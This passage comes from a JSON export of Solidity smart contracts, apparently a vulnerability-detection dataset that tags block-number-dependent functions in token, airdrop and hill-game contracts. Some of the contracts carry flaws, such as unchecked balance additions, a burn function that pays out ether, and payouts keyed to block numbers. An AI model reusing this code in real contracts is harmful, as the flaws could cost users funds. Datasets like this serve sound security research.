balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8e"
  },
  "filename": "587.sol",
  "content": "pragma solidity ^0.4.22;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Base {\n uint private bitlocks = 0;\n modifier noAnyReentrancy {\n uint _locks = bitlocks;\n require(_locks <= 0);\n bitlocks = uint(-1);\n _;\n bitlocks = _locks;\n }\n modifier only(address allowed) {\n require(msg.sender == allowed);\n _;\n }\n modifier onlyPayloadSize(uint size) {\n assert(msg.data.length == size + 4);\n _;\n }\n}\ncontract ERC20 is Base {\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n using SafeMath for uint;\n uint public totalSupply;\n bool public isFrozen = false;\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n modifier isNotFrozenOnly() {\n require(!isFrozen);\n _;\n }\n modifier isFrozenOnly(){\n require(isFrozen);\n _;\n }\n function transferFrom(address _from, address _to, uint _value) public isNotFrozenOnly onlyPayloadSize(3 * 32) returns (bool success) {\n require(_to != address(0));\n require(_to != address(this));\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint balance) {\n return balances[_owner];\n }\n function approve_fixed(address _spender, uint _currentValue, uint _value) public isNotFrozenOnly onlyPayloadSize(3 * 32) returns (bool success) {\n if(allowed[msg.sender][_spender] == _currentValue){\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address _spender, uint _value) public isNotFrozenOnly onlyPayloadSize(2 * 32) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Whitelist {\n mapping(address => bool) public whitelist;\n mapping(address => bool) operators;\n address authority;\n constructor(address _authority) {\n authority = _authority;\n operators[_authority] = true;\n }\n function add(address _address) public {\n require(operators[msg.sender]);\n whitelist[_address] = true;\n }\n function remove(address _address) public {\n require(operators[msg.sender]);\n whitelist[_address] = false;\n }\n function addOperator(address _address) public {\n require(authority == msg.sender);\n operators[_address] = true;\n }\n function removeOperator(address _address) public {\n require(authority == msg.sender);\n operators[_address] = false;\n }\n}\ncontract Token is ERC20 {\n string public constant name = \"Array.io Token\";\n string public constant symbol = \"eRAY\";\n uint8 public constant decimals = 18;\n uint public tgrSettingsAmount;\n uint public tgrSettingsMinimalContribution;\n uint public tgrSettingsPartContributor;\n uint public tgrSettingsPartProject;\n uint public tgrSettingsPartFounders;\n uint public tgrSettingsBlocksPerStage;\n uint public tgrSettingsPartContributorIncreasePerStage;\n uint public tgrSettingsMaxStages;\n uint public tgrStartBlock;\n uint public tgrNumber;\n uint public tgrAmountCollected;\n uint public tgrContributedAmount;\n address public projectWallet;\n address public foundersWallet;\n address constant public burnAddress = address(0);\n mapping (address => uint) public invBalances;\n uint public totalInvSupply;\n Whitelist public whitelist;\n modifier isTgrLive(){\n require(tgrLive());\n _;\n }\n modifier isNotTgrLive(){\n require(!tgrLive());\n _;\n }\n event Burn(address indexed _owner, uint _value);\n event TGRStarted(uint tgrSettingsAmount,\n uint tgrSettingsMinimalContribution,\n uint tgrSettingsPartContributor,\n uint tgrSettingsPartProject,\n uint tgrSettingsPartFounders,\n uint tgrSettingsBlocksPerStage,\n uint tgrSettingsPartContributorIncreasePerStage,\n uint tgrSettingsMaxStages,\n uint blockNumber,\n uint tgrNumber);\n event TGRFinished(uint blockNumber, uint amountCollected);\n constructor(address _projectWallet, address _foundersWallet) public {\n projectWallet = _projectWallet;\n foundersWallet = _foundersWallet;\n }\n function () public payable isTgrLive isNotFrozenOnly noAnyReentrancy {\n require(whitelist.whitelist(msg.sender));\n require(tgrAmountCollected < tgrSettingsAmount);\n require(msg.value >= tgrSettingsMinimalContribution);\n uint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\n require(stage < tgrSettingsMaxStages);\n uint etherToRefund = 0;\n uint etherContributed = msg.value;\n uint currentPartContributor = tgrSettingsPartContributor.add(stage.mul(tgrSettingsPartContributorIncreasePerStage));\n uint allStakes = currentPartContributor.add(tgrSettingsPartProject).add(tgrSettingsPartFounders);\n uint remainsToContribute = (tgrSettingsAmount.sub(tgrAmountCollected)).mul(allStakes).div(tgrSettingsPartProject);\n if ((tgrSettingsAmount.sub(tgrAmountCollected)).mul(allStakes) % tgrSettingsPartProject != 0) {\n remainsToContribute = remainsToContribute + allStakes;\n }\n if (remainsToContribute < msg.value) {\n etherToRefund = msg.value.sub(remainsToContribute);\n etherContributed = remainsToContribute;\n }\n uint tokensProject = etherContributed.mul(tgrSettingsPartProject).div(allStakes);\n uint tokensFounders = etherContributed.mul(tgrSettingsPartFounders).div(allStakes);\n uint tokensContributor = etherContributed.sub(tokensProject).sub(tokensFounders);\n tgrAmountCollected = tgrAmountCollected.add(tokensProject);\n tgrContributedAmount = tgrContributedAmount.add(etherContributed);\n _mint(tokensProject, tokensFounders, tokensContributor);\n msg.sender.transfer(etherToRefund);\n }\n function tgrSetLive() public only(projectWallet) isNotTgrLive isNotFrozenOnly {\n tgrNumber +=1;\n tgrStartBlock = block.number;\n tgrAmountCollected = 0;\n tgrContributedAmount = 0;\n emit TGRStarted(tgrSettingsAmount,\n tgrSettingsMinimalContribution,\n tgrSettingsPartContributor,\n tgrSettingsPartProject,\n tgrSettingsPartFounders,\n tgrSettingsBlocksPerStage,\n tgrSettingsPartContributorIncreasePerStage,\n tgrSettingsMaxStages,\n block.number,\n tgrNumber);\n }\n function tgrSetFinished() public only(projectWallet) isTgrLive isNotFrozenOnly {\n emit TGRFinished(block.number, tgrAmountCollected);\n tgrStartBlock = 0;\n }\n function burn(uint _amount) public isNotFrozenOnly noAnyReentrancy returns(bool _success) {\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[burnAddress] = balances[burnAddress].add(_amount);\n totalSupply = totalSupply.sub(_amount);\n msg.sender.transfer(_amount);\n emit Transfer(msg.sender, burnAddress, _amount);\n emit Burn(burnAddress, _amount);\n return true;\n }\n function transfer(address _to, uint _value) public isNotFrozenOnly onlyPayloadSize(2 * 32) returns (bool success) {\n require(_to != address(0));\n require(_to != address(this));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function multiTransfer(address[] dests, uint[] values) public isNotFrozenOnly returns(uint) {\n uint i = 0;\n while (i < dests.length) {\n transfer(dests[i], values[i]);\n i += 1;\n }\n return i;\n }\n function withdrawFrozen() public isFrozenOnly noAnyReentrancy {\n uint amountWithdraw = totalSupply.mul(invBalances[msg.sender]).div(totalInvSupply);\n if (amountWithdraw > address(this).balance) {\n amountWithdraw = address(this).balance;\n }\n invBalances[msg.sender] = 0;\n msg.sender.transfer(amountWithdraw);\n }\n function setWhitelist(address _address) public only(projectWallet) isNotFrozenOnly returns (bool) {\n whitelist = Whitelist(_address);\n }\n function executeSettingsChange(\n uint amount,\n uint minimalContribution,\n uint partContributor,\n uint partProject,\n uint partFounders,\n uint blocksPerStage,\n uint partContributorIncreasePerStage,\n uint maxStages\n )\n public\n only(projectWallet)\n isNotTgrLive\n isNotFrozenOnly\n returns(bool success)\n {\n tgrSettingsAmount = amount;\n tgrSettingsMinimalContribution = minimalContribution;\n tgrSettingsPartContributor = partContributor;\n tgrSettingsPartProject = partProject;\n tgrSettingsPartFounders = partFounders;\n tgrSettingsBlocksPerStage = blocksPerStage;\n tgrSettingsPartContributorIncreasePerStage = partContributorIncreasePerStage;\n tgrSettingsMaxStages = maxStages;\n return true;\n }\n function setFreeze() public only(projectWallet) isNotFrozenOnly returns (bool) {\n isFrozen = true;\n return true;\n }\n function _mint(uint _tokensProject, uint _tokensFounders, uint _tokensContributor) internal {\n balances[projectWallet] = balances[projectWallet].add(_tokensProject);\n balances[foundersWallet] = balances[foundersWallet].add(_tokensFounders);\n balances[msg.sender] = balances[msg.sender].add(_tokensContributor);\n invBalances[msg.sender] = invBalances[msg.sender].add(_tokensContributor).add(_tokensFounders).add(_tokensProject);\n totalInvSupply = totalInvSupply.add(_tokensContributor).add(_tokensFounders).add(_tokensProject);\n totalSupply = totalSupply.add(_tokensProject).add(_tokensFounders).add(_tokensContributor);\n emit Transfer(0x0, msg.sender, _tokensContributor);\n emit Transfer(0x0, projectWallet, _tokensProject);\n emit Transfer(0x0, foundersWallet, _tokensFounders);\n }\n function tgrLive() view public returns(bool) {\n if (tgrStartBlock == 0) {\n return false;\n }\n uint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\n if (stage < tgrSettingsMaxStages) {\n if (tgrAmountCollected >= tgrSettingsAmount){\n return false;\n } else {\n return true;\n }\n } else {\n return false;\n }\n }\n function tgrStageBlockLeft() public view returns(int) {\n if (tgrLive()) {\n uint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\n return int(tgrStartBlock.add((stage+1).mul(tgrSettingsBlocksPerStage)).sub(block.number));\n } else {\n return -1;\n }\n }\n function tgrCurrentPartContributor() public view returns(int) {\n if (tgrLive()) {\n uint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\n return int(tgrSettingsPartContributor.add(stage.mul(tgrSettingsPartContributorIncreasePerStage)));\n } else {\n return -1;\n }\n }\n function tgrNextPartContributor() public view returns(int) {\n if (tgrLive()) {\n uint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage).add(1);\n return int(tgrSettingsPartContributor.add(stage.mul(tgrSettingsPartContributorIncreasePerStage)));\n } else {\n return -1;\n }\n }\n function tgrCurrentStage() public view returns(int) {\n if (tgrLive()) {\n return int(block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage).add(1));\n } else {\n return -1;\n }\n }\n}",
  "extract_feature": [
    "function tgrSetLive() public only(projectWallet) isNotTgrLive isNotFrozenOnly {\ntgrNumber +=1;\ntgrStartBlock = block.number;\ntgrAmountCollected = 0;\ntgrContributedAmount = 0;\nemit TGRStarted(tgrSettingsAmount,\ntgrSettingsMinimalContribution,\ntgrSettingsPartContributor,\ntgrSettingsPartProject,\ntgrSettingsPartFounders,\ntgrSettingsBlocksPerStage,\ntgrSettingsPartContributorIncreasePerStage,\ntgrSettingsMaxStages,\nblock.number,\ntgrNumber);\n}",
    "function tgrSetFinished() public only(projectWallet) isTgrLive isNotFrozenOnly {\nemit TGRFinished(block.number, tgrAmountCollected);\ntgrStartBlock = 0;\n}",
    "function tgrLive() view public returns(bool) {\nif (tgrStartBlock == 0) {\nreturn false;\n}\nuint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\nif (stage < tgrSettingsMaxStages) {\nif (tgrAmountCollected >= tgrSettingsAmount){\nreturn false;\n} else {\nreturn true;\n}\n} else {\nreturn false;\n}\n}",
    "function tgrStageBlockLeft() public view returns(int) {\nif (tgrLive()) {\nuint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\nreturn int(tgrStartBlock.add((stage+1).mul(tgrSettingsBlocksPerStage)).sub(block.number));\n} else {\nreturn -1;\n}\n}",
    "function tgrCurrentPartContributor() public view returns(int) {\nif (tgrLive()) {\nuint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage);\nreturn int(tgrSettingsPartContributor.add(stage.mul(tgrSettingsPartContributorIncreasePerStage)));\n} else {\nreturn -1;\n}\n}",
    "function tgrNextPartContributor() public view returns(int) {\nif (tgrLive()) {\nuint stage = block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage).add(1);\nreturn int(tgrSettingsPartContributor.add(stage.mul(tgrSettingsPartContributorIncreasePerStage)));\n} else {\nreturn -1;\n}\n}",
    "function tgrCurrentStage() public view returns(int) {\nif (tgrLive()) {\nreturn int(block.number.sub(tgrStartBlock).div(tgrSettingsBlocksPerStage).add(1));\n} else {\nreturn -1;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8f"
  },
  "filename": "642.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b90"
  },
  "filename": "661.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b91"
  },
  "filename": "672.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n event OwnershipTransferred(address indexed _from, address indexed _to);\n constructor() public {\n owner = 0x0B0eFad4aE088a88fFDC50BCe5Fb63c6936b9220;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract FixedSupplyToken is ERC20Interface, Owned {\n using SafeMath for uint;\n string public symbol;\n string public name;\n uint8 public decimals;\n uint _totalSupply;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowed;\n constructor() public {\n symbol = \"DOTCH\";\n name = \"Diamond Of The Crypto Hill\";\n decimals = 0;\n _totalSupply = 10000000000;\n balances[this] = _totalSupply;\n emit Transfer(address(0),this, _totalSupply);\n }\n function totalSupply() public view returns (uint) {\n return _totalSupply.sub(balances[address(0)]);\n }\n function balanceOf(address tokenOwner) public view returns (uint balance) {\n return balances[tokenOwner];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n balances[msg.sender] = balances[msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n balances[from] = balances[from].sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n emit Transfer(from, to, tokens);\n return true;\n }\n function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n return true;\n }\n function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\n return ERC20Interface(tokenAddress).transfer(owner, tokens);\n }\n}\ninterface HourglassInterface {\n function() payable external;\n function buy(address _playerAddress) payable external returns(uint256);\n function sell(uint256 _amountOfTokens) external;\n function reinvest() external;\n function withdraw() external;\n function exit() external;\n function dividendsOf(address _playerAddress) external view returns(uint256);\n function balanceOf(address _playerAddress) external view returns(uint256);\n function transfer(address _toAddress, uint256 _amountOfTokens) external returns(bool);\n function stakingRequirement() external view returns(uint256);\n}\ncontract Game is FixedSupplyToken {\nHourglassInterface constant P3Dcontract_ = HourglassInterface(0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe);\nstruct Village {\n address owner;\n uint defending;\n uint lastcollect;\n uint beginnerprotection;\n}\nstruct Variables {\n uint nextVillageId;\n uint bpamount;\n uint totalsupplyGOTCH;\n uint GOTCHatcontract;\n uint previousethamount;\n uint solsforhire;\n uint solslastupdate;\n uint soldierreplenishrate;\n uint soldierprice;\n uint lastblockpayout;\n uint blocksbeforenewpay;\n uint ATPO;\n uint nextpayamount;\n uint nextowneramount;\n}\nstruct Ownables {\n address hillowner;\n uint soldiersdefendinghill;\n mapping(address => uint256) soldiers;\n mapping(uint256 => Village) villages;\n mapping(address => uint256) GOTCH;\n mapping(address => uint256) redeemedvils;\n bool ERCtradeactive;\n uint roundlength;\n}\nstruct Marketoffer{\n address placedby;\n uint256 amountdotch;\n uint256 wantsthisamtweiperdotch;\n}\nevent villtakeover(address from, address to, uint villageint);\nevent hilltakeover(address from, address to);\nevent battle(address attacker, uint pointsattacker, address defender, uint pointsdefender);\nevent dotchsale( address seller,uint price, address taker , uint256 amount);\nuint256 public ethforp3dbuy;\nuint256 public round;\nuint256 public nextmarketoffer;\nuint256 public nextroundlength = 10000000000000000000000;\nuint256 public nextroundtotalsupplyGOTCH = 10000;\nuint256 public nextroundGOTCHatcontract = 10000;\nuint256 public nextroundsolsforhire = 100;\nuint256 public nextroundsoldierreplenishrate = 50;\nuint256 public nextroundblocksbeforenewpay = 250;\nbool public divsforall;\nbool public nextroundERCtradeactive = true;\nmapping(uint256 => Variables) public roundvars;\nmapping(uint256 => Ownables) public roundownables;\n mapping(address => uint256) public Redeemable;\n mapping(uint256 => Marketoffer) public marketplace;\nfunction harvestabledivs()\n view\n public\n returns(uint256)\n {\n return ( P3Dcontract_.dividendsOf(address(this))) ;\n }\nfunction villageinfo(uint256 lookup)\n view\n public\n returns(address owner, uint256 soldiersdefending,uint256 lastcollect,uint256 beginnersprotection)\n {\n return ( roundownables[round].villages[lookup].owner,roundownables[round].villages[lookup].defending,roundownables[round].villages[lookup].lastcollect,roundownables[round].villages[lookup].beginnerprotection) ;\n }\nfunction gotchinfo(address lookup)\n view\n public\n returns(uint256 Gold)\n {\n return ( roundownables[round].GOTCH[lookup]) ;\n }\nfunction soldiersinfo(address lookup)\n view\n public\n returns(uint256 soldiers)\n {\n return ( roundownables[round].soldiers[lookup]) ;\n }\nfunction redeemablevilsinfo(address lookup)\n view\n public\n returns(uint256 redeemedvils)\n {\n return ( roundownables[round].redeemedvils[lookup]) ;\n }\nfunction playerinfo(address lookup)\n view\n public\n returns(uint256 redeemedvils,uint256 redeemablevils , uint256 soldiers, uint256 GOTCH)\n {\n return (\n roundownables[round].redeemedvils[lookup],\n Redeemable[lookup],\n roundownables[round].soldiers[lookup],\n roundownables[round].GOTCH[lookup]\n ) ;\n }\nuint256 private div;\nuint256 private ethtosend;\nfunction () external payable{}\nconstructor () public {\n round++;\n roundvars[round].totalsupplyGOTCH = 10000;\n roundvars[round].GOTCHatcontract = 10000;\n roundvars[round].solsforhire = 100;\n roundvars[round].soldierreplenishrate = 50;\n roundvars[round].solslastupdate = block.number;\n updatesolbuyrate();\n roundvars[round].lastblockpayout = block.number;\n roundownables[round].hillowner = msg.sender;\n roundvars[round].nextpayamount = 0;\n roundvars[round].nextowneramount = 0;\n roundvars[round].previousethamount = 0;\n roundvars[round].blocksbeforenewpay = 250;\n roundvars[round].bpamount = 30000;\n roundownables[round].ERCtradeactive = true;\n roundownables[round].roundlength = 10000000000000000000000;\n divsforall = false;\n }\nfunction hillpayout() internal {\n require(block.number > roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay));\n roundvars[round].lastblockpayout = roundvars[round].lastblockpayout.add(roundvars[round].blocksbeforenewpay);\n ethforp3dbuy = ethforp3dbuy.add((address(this).balance.sub(ethforp3dbuy)).div(100));\n owner.transfer((address(this).balance.sub(ethforp3dbuy)).div(100));\n roundvars[round].ATPO = roundvars[round].ATPO.add((address(this).balance.sub(ethforp3dbuy)).div(2));\n roundownables[round].hillowner.transfer((address(this).balance.sub(ethforp3dbuy)).div(2));\n}\nfunction attackhill(uint256 amtsoldiers) public payable returns(bool, uint){\n require(msg.value >= 